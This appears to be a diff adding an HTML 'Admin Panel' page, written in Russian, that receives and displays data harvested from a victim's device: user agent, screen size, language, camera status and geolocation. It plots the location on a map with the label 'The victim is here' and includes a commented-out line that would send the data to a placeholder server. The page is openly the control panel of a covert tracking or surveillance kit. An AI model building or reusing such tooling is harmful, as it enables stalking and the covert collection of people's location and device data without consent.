@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
+        #data { white-space: pre-wrap; background: #111; color: #0f0; padding: 15px; }
+        #map { height: 300px; margin-top: 20px; }
+    </style>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
+</head>
+<body>
+    <h1>Собранные данные</h1>
+    <div id="data">Ожидание данных...</div>
+    <div id="map"></div>
+
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+    <script>
+        const dataElement = document.getElementById('data');
+        let map;
+
+        // Обработчик входящих данных
+        window.addEventListener('message', (event) => {
+            const data = event.data;
+            
+            // Форматируем данные для отображения
+            let output = `Время: ${new Date(data.time).toLocaleString()}\n`;
+            output += `Устройство: ${data.userAgent}\n`;
+            output += `Экран: ${data.screen}\n`;
+            output += `Язык: ${data.language}\n`;
+            output += `Камера: ${data.camera}\n`;
+            
+            if (data.location && typeof data.location === 'object') {
+                output += `Геолокация: ${data.location.lat}, ${data.location.lng}\n`;
+                updateMap(data.location.lat, data.location.lng);
+            } else {
+                output += `Геолокация: ${data.location}\n`;
+            }
+            
+            dataElement.textContent = output;
+            
+            // Здесь можно добавить отправку данных на сервер
+            // fetch('https://ваш-сервер/api/save', { method: 'POST', body: JSON.stringify(data) });
+        });
+
+        // Инициализация карты
+        function updateMap(lat, lng) {
+            if (!map) {
+                map = L.map('map').setView([lat, lng], 15);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+            }
+            L.marker([lat, lng]).addTo(map).bindPopup("Жертва здесь");
+        }
+    </script>
+</body>
+</html>
